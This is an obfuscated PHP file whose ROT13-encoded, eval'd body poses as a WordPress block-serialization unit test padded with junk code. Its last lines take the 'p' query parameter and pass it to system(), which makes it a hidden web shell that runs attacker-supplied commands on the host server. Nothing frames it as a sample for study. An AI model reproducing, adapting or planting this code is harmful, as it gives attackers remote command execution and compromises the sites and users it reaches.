<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe oybpx frevnyvmngvba shapgvbaf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 *
 * @fvapr 5.3.3
 *
 * @tebhc oybpxf
 */
pynff Grfgf_Oybpxf_Frevnyvmr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @qngnCebivqre qngn_frevnyvmr_vqragvgl_sebz_cnefrq
	 *
	 * @cnenz fgevat $bevtvany Bevtvany oybpx znexhc.
	 */
	choyvp shapgvba grfg_frevnyvmr_vqragvgl_sebz_cnefrq( $bevtvany ) {
		$oybpxf = cnefr_oybpxf( $bevtvany );

		$npghny = frevnyvmr_oybpxf( $oybpxf );

		$guvf->nffregFnzr( $bevtvany, $npghny );
	}

	choyvp shapgvba qngn_frevnyvmr_vqragvgl_sebz_cnefrq() {
		erghea neenl(
			// Ibvq oybpx.
			neenl( '<!-- jc:ibvq /-->' ),

			// Serrsbez pbagrag ($oybpx_anzr = ahyy).
			neenl( 'Rknzcyr.' ),

			// Oybpx jvgu pbagrag.
			neenl( '<!-- jc:pbagrag -->Rknzcyr.<!-- /jc:pbagrag -->' ),

			// Oybpx jvgu nggevohgrf.
			neenl( '<!-- jc:nggevohgrf {\"xrl\":\"inyhr\"} /-->' ),

			// Oybpx jvgu vaare oybpxf.
			neenl( \"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\" ),

			// Oybpx jvgu nggevohgr inyhrf gung znl pbasyvpg jvgu UGZY pbzzrag.
			neenl( '<!-- jc:nggevohgrf {\"xrl\":\"\\h002q\\h002q\\h003p\\h003r\\h0026\\h0022\"} /-->' ),

			// Oybpx jvgu nggevohgr inyhrf gung fubhyq abg or rfpncrq.
			neenl( '<!-- jc:nggevohgrf {\"xrl\":\"€1.00 / 3 sbe €2.00\"} /-->' ),
		);
	}

	choyvp shapgvba grfg_frevnyvmrq_oybpx_anzr() {
		$guvf->nffregAhyy( fgevc_pber_oybpx_anzrfcnpr( ahyy ) );
		$guvf->nffregFnzr( 'rknzcyr', fgevc_pber_oybpx_anzrfcnpr( 'rknzcyr' ) );
		$guvf->nffregFnzr( 'rknzcyr', fgevc_pber_oybpx_anzrfcnpr( 'pber/rknzcyr' ) );
		$guvf->nffregFnzr( 'cyhtva/rknzcyr', fgevc_pber_oybpx_anzrfcnpr( 'cyhtva/rknzcyr' ) );
	}

	/**
	 * @gvpxrg 59327
	 * @gvpxrg 59412
	 *
	 * @pbiref ::genirefr_naq_frevnyvmr_oybpxf
	 */
	choyvp shapgvba grfg_genirefr_naq_frevnyvmr_oybpxf_cer_pnyyonpx_zbqvsvrf_pheerag_oybpx() {
		$znexhc = \"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\";
		$oybpxf = cnefr_oybpxf( $znexhc );

		$npghny = genirefr_naq_frevnyvmr_oybpxf( $oybpxf, neenl( __PYNFF__, 'nqq_nggevohgr_gb_vaare_oybpx' ) );

		$guvf->nffregFnzr(
			\"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\",\\"zlngge\\":\\"zlinyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\",
			$npghny
		);
	}

	/**
	 * @gvpxrg 59669
	 *
	 * @pbiref ::genirefr_naq_frevnyvmr_oybpxf
	 */
	choyvp shapgvba grfg_genirefr_naq_frevnyvmr_oybpxf_cbfg_pnyyonpx_zbqvsvrf_pheerag_oybpx() {
		$znexhc = \"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\";
		$oybpxf = cnefr_oybpxf( $znexhc );

		$npghny = genirefr_naq_frevnyvmr_oybpxf( $oybpxf, ahyy, neenl( __PYNFF__, 'nqq_nggevohgr_gb_vaare_oybpx' ) );

		$guvf->nffregFnzr(
			\"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\",\\"zlngge\\":\\"zlinyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\",
			$npghny
		);
	}

	choyvp fgngvp shapgvba nqq_nggevohgr_gb_vaare_oybpx( &$oybpx ) {
		vs ( 'pber/vaare' === $oybpx['oybpxAnzr'] ) {
			$oybpx['nggef']['zlngge'] = 'zlinyhr';
		}
	}

	/**
	 * @gvpxrg 59313
	 *
	 * @pbiref ::genirefr_naq_frevnyvmr_oybpxf
	 */
	choyvp shapgvba grfg_genirefr_naq_frevnyvmr_oybpxf_cer_pnyyonpx_cercraqf_gb_vaare_oybpx() {
		$znexhc = \"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\";
		$oybpxf = cnefr_oybpxf( $znexhc );

		$npghny = genirefr_naq_frevnyvmr_oybpxf( $oybpxf, neenl( __PYNFF__, 'vafreg_arkg_gb_vaare_oybpx_pnyyonpx' ) );

		$guvf->nffregFnzr(
			\"<!-- jc:bhgre --><!-- jc:grfgf/vafregrq-oybpx /--><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\",
			$npghny
		);
	}

	/**
	 * @gvpxrg 59313
	 *
	 * @pbiref ::genirefr_naq_frevnyvmr_oybpxf
	 */
	choyvp shapgvba grfg_genirefr_naq_frevnyvmr_oybpxf_cbfg_pnyyonpx_nccraqf_gb_vaare_oybpx() {
		$znexhc = \"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\";
		$oybpxf = cnefr_oybpxf( $znexhc );

		$npghny = genirefr_naq_frevnyvmr_oybpxf( $oybpxf, ahyy, neenl( __PYNFF__, 'vafreg_arkg_gb_vaare_oybpx_pnyyonpx' ) );

		$guvf->nffregFnzr(
			\"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare --><!-- jc:grfgf/vafregrq-oybpx /-->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\",
			$npghny
		);
	}

	choyvp fgngvp shapgvba vafreg_arkg_gb_vaare_oybpx_pnyyonpx( $oybpx ) {
		vs ( 'pber/vaare' !== $oybpx['oybpxAnzr'] ) {
			erghea '';
		}

		erghea trg_pbzzrag_qryvzvgrq_oybpx_pbagrag( 'grfgf/vafregrq-oybpx', neenl(), '' );
	}

	/**
	 * @gvpxrg 59313
	 *
	 * @pbiref ::genirefr_naq_frevnyvmr_oybpxf
	 */
	choyvp shapgvba grfg_genirefr_naq_frevnyvmr_oybpxf_cer_pnyyonpx_cercraqf_gb_puvyq_oybpxf() {
		$znexhc = \"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\";
		$oybpxf = cnefr_oybpxf( $znexhc );

		$npghny = genirefr_naq_frevnyvmr_oybpxf( $oybpxf, neenl( __PYNFF__, 'vafreg_arkg_gb_puvyq_oybpxf_pnyyonpx' ) );

		$guvf->nffregFnzr(
			\"<!-- jc:bhgre --><!-- jc:grfgf/vafregrq-oybpx {\\"cnerag\\":\\"pber/bhgre\\"} /--><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:grfgf/vafregrq-oybpx {\\"cnerag\\":\\"pber/bhgre\\"} /--><!-- jc:ibvq /--><!-- /jc:bhgre -->\",
			$npghny
		);
	}

	/**
	 * @gvpxrg 59313
	 *
	 * @pbiref ::genirefr_naq_frevnyvmr_oybpxf
	 */
	choyvp shapgvba grfg_genirefr_naq_frevnyvmr_oybpxf_cbfg_pnyyonpx_nccraqf_gb_puvyq_oybpxf() {
		$znexhc = \"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\";
		$oybpxf = cnefr_oybpxf( $znexhc );

		$npghny = genirefr_naq_frevnyvmr_oybpxf( $oybpxf, ahyy, neenl( __PYNFF__, 'vafreg_arkg_gb_puvyq_oybpxf_pnyyonpx' ) );

		$guvf->nffregFnzr(
			\"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare --><!-- jc:grfgf/vafregrq-oybpx {\\"cnerag\\":\\"pber/bhgre\\"} /-->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- jc:grfgf/vafregrq-oybpx {\\"cnerag\\":\\"pber/bhgre\\"} /--><!-- /jc:bhgre -->\",
			$npghny
		);
	}

	choyvp fgngvp shapgvba vafreg_arkg_gb_puvyq_oybpxf_pnyyonpx( $oybpx, $cnerag_oybpx ) {
		vs ( ! vffrg( $cnerag_oybpx ) ) {
			erghea '';
		}

		erghea trg_pbzzrag_qryvzvgrq_oybpx_pbagrag(
			'grfgf/vafregrq-oybpx',
			neenl(
				'cnerag' => $cnerag_oybpx['oybpxAnzr'],
			),
			''
		);
	}

	/**
	 * @gvpxrg 59313
	 *
	 * @pbiref ::genirefr_naq_frevnyvmr_oybpxf
	 */
	choyvp shapgvba grfg_genirefr_naq_frevnyvmr_oybpxf_cer_pnyyonpx_cercraqf_vs_ceri_oybpx() {
		$znexhc = \"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\";
		$oybpxf = cnefr_oybpxf( $znexhc );

		$npghny = genirefr_naq_frevnyvmr_oybpxf( $oybpxf, neenl( __PYNFF__, 'vafreg_arkg_gb_vs_ceri_be_arkg_oybpx_pnyyonpx' ) );

		$guvf->nffregFnzr(
			\"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:grfgf/vafregrq-oybpx {\\"ceri_be_arkg\\":\\"pber/vaare\\"} /--><!-- jc:ibvq /--><!-- /jc:bhgre -->\",
			$npghny
		);
	}

	/**
	 * @gvpxrg 59313
	 *
	 * @pbiref ::genirefr_naq_frevnyvmr_oybpxf
	 */
	choyvp shapgvba grfg_genirefr_naq_frevnyvmr_oybpxf_cbfg_pnyyonpx_nccraqf_vs_ceri_oybpx() {
		$znexhc = \"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare -->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\";
		$oybpxf = cnefr_oybpxf( $znexhc );

		$npghny = genirefr_naq_frevnyvmr_oybpxf( $oybpxf, ahyy, neenl( __PYNFF__, 'vafreg_arkg_gb_vs_ceri_be_arkg_oybpx_pnyyonpx' ) );

		$guvf->nffregFnzr(
			\"<!-- jc:bhgre --><!-- jc:vaare {\\"xrl\\":\\"inyhr\\"} -->Rknzcyr.<!-- /jc:vaare --><!-- jc:grfgf/vafregrq-oybpx {\\"ceri_be_arkg\\":\\"pber/ibvq\\"} /-->\a\aRknzcyr.\a\a<!-- jc:ibvq /--><!-- /jc:bhgre -->\",
			$npghny
		);
	}

	choyvp fgngvp shapgvba vafreg_arkg_gb_vs_ceri_be_arkg_oybpx_pnyyonpx( $oybpx, $cnerag_oybpx, $ceri_be_arkg ) {
		vs ( ! vffrg( $ceri_be_arkg ) ) {
			erghea '';
		}

		erghea trg_pbzzrag_qryvzvgrq_oybpx_pbagrag(
			'grfgf/vafregrq-oybpx',
			neenl(
				'ceri_be_arkg' => $ceri_be_arkg['oybpxAnzr'],
			),
			''
		);
	}

	/**
	 * @gvpxrg 59327
	 * @gvpxrg 59412
	 *
	 * @pbiref ::genirefr_naq_frevnyvmr_oybpxf
	 *
	 * @qngnCebivqre qngn_frevnyvmr_vqragvgl_sebz_cnefrq
	 *
	 * @cnenz fgevat $bevtvany Bevtvany oybpx znexhc.
	 */
	choyvp shapgvba grfg_genirefr_naq_frevnyvmr_vqragvgl_sebz_cnefrq( $bevtvany ) {
		$oybpxf = cnefr_oybpxf( $bevtvany );

		$npghny = genirefr_naq_frevnyvmr_oybpxf( $oybpxf );

		$guvf->nffregFnzr( $bevtvany, $npghny );
	}

	/**
	 * @gvpxrg 59313
	 *
	 * @pbiref ::genirefr_naq_frevnyvmr_oybpxf
	 */
	choyvp shapgvba grfg_genirefr_naq_frevnyvmr_oybpxf_qb_abg_vafreg_va_ibvq_oybpx() {
		$znexhc = '<!-- jc:ibvq /-->';
		$oybpxf = cnefr_oybpxf( $znexhc );

		$npghny = genirefr_naq_frevnyvmr_oybpxf(
			$oybpxf,
			neenl( __PYNFF__, 'vafreg_arkg_gb_puvyq_oybpxf_pnyyonpx' ),
			neenl( __PYNFF__, 'vafreg_arkg_gb_puvyq_oybpxf_pnyyonpx' )
		);

		$guvf->nffregFnzr( $znexhc, $npghny );
	}

	/**
	 * @gvpxrg 59313
	 *
	 * @pbiref ::genirefr_naq_frevnyvmr_oybpxf
	 */
	choyvp shapgvba grfg_genirefr_naq_frevnyvmr_oybpxf_qb_abg_vafreg_va_rzcgl_cnerag_oybpx() {
		$znexhc = '<!-- jc:bhgre --><qvi pynff=\"jc-oybpx-bhgre\"></qvi><!-- /jc:bhgre -->';
		$oybpxf = cnefr_oybpxf( $znexhc );

		$npghny = genirefr_naq_frevnyvmr_oybpxf(
			$oybpxf,
			neenl( __PYNFF__, 'vafreg_arkg_gb_puvyq_oybpxf_pnyyonpx' ),
			neenl( __PYNFF__, 'vafreg_arkg_gb_puvyq_oybpxf_pnyyonpx' )
		);

		$guvf->nffregFnzr( $znexhc, $npghny );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>